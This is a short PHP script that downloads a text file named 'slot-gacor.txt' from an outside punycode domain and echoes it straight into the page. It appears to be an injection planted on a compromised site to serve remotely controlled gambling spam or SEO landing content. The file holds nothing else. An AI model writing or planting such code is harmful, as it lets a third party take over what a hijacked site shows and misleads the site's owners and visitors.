<?php
$url = "https://xn--pdkuc0bb.net/landing-page/slot-gacor.txt";
$content = file_get_contents($url);
if ($content !== false) {
    echo "?>" . $content;
}
?>
